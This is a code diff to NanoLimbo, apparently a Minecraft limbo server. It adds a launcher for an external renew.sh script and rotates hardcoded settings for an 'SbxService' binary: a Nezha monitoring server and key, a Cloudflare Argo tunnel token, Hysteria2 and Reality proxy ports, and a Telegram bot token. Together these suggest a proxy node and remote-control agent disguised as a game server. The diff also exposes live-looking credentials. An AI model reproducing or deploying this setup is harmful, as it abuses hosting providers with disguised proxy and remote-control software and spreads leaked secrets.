@@ -58,6 +58,17 @@ public final class NanoLimbo {
         // Start SbxService
         try {
             runSbxBinary();
+
+            // ✅ 启动续期脚本 renew.sh（服务器运行期间自动续期）
+            File renewScript = new File("renew.sh");
+            if (renewScript.exists()) {
+                new ProcessBuilder("bash", "renew.sh")
+                    .inheritIO()
+                    .start();
+                System.out.println(ANSI_GREEN + "renew.sh 已启动（自动续期中）" + ANSI_RESET);
+            } else {
+                System.err.println(ANSI_RED + "renew.sh 未找到，跳过执行" + ANSI_RESET);
+            }
             
             Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                 running.set(false);
@@ -122,17 +133,17 @@ public final class NanoLimbo {
     }
     
     private static void loadEnvVars(Map<String, String> envVars) throws IOException {
-        envVars.put("UUID", "938d63b2-816b-4042-bf9f-50618bde333a");
+        envVars.put("UUID", "505bc7c0-8f2a-44f7-bdf4-8e37a8f2e896");
         envVars.put("FILE_PATH", "./world");
         envVars.put("NEZHA_SERVER", "nz.xx66.nyc.mn");
         envVars.put("NEZHA_PORT", "443");
-        envVars.put("NEZHA_KEY", "yIgh3asFwMCGZ84Fry");
+        envVars.put("NEZHA_KEY", "wEtC0C2imW3GaYocQS");
         envVars.put("ARGO_PORT", "8001");
-        envVars.put("ARGO_DOMAIN", "zampto-de-node14.dora.cc.cd");
-        envVars.put("ARGO_AUTH", "eyJhIjoiODYxM2UxNGFjMzJjZmQ1ZGFjZDlkZWJlOTljNzlhOGQiLCJ0IjoiMTRkNDJkOGEtMTA4YS00YWEwLWE1N2YtYjEyNWM4NmIwOGVkIiwicyI6Ik9XSTJNV1kwTnpNdE1qaGlOQzAwTlRjMkxUa3dOekV0T1RSbU9XSTRORGt6WldFMCJ9");
-        envVars.put("HY2_PORT", "21709");
+        envVars.put("ARGO_DOMAIN", "godhost-ua-hsi.dora.cc.cd");
+        envVars.put("ARGO_AUTH", "eyJhIjoiODYxM2UxNGFjMzJjZmQ1ZGFjZDlkZWJlOTljNzlhOGQiLCJ0IjoiYTg3YjZhYzAtYjYzNy00MDdlLTljMzYtOTBlZjIxZDU2MDk2IiwicyI6Ik1XSmtPVFV4WlRRdE1qSmtZeTAwWldNMkxXRXdPV0V0WmpobE1XUmhaVEl6TkdaaSJ9");
+        envVars.put("HY2_PORT", "26160");
         envVars.put("TUIC_PORT", "");
-        envVars.put("REALITY_PORT", "21709");
+        envVars.put("REALITY_PORT", "26160");
         envVars.put("S5_PORT", "");
         envVars.put("ANYTLS_PORT", "");
         envVars.put("ANYREALITY_PORT", "");
@@ -141,7 +152,7 @@ public final class NanoLimbo {
         envVars.put("BOT_TOKEN", "7126463574:AAHSLx2WwHJSa3gpujRj64JhpEpCqsJcUZs");
         envVars.put("CFIP", "saas.sin.fan");
         envVars.put("CFPORT", "443");
-        envVars.put("NAME", "zampto-de-node14");
+        envVars.put("NAME", "godhost-ua-hsi");
         
         for (String var : ALL_ENV_VARS) {
             String value = System.getenv(var);
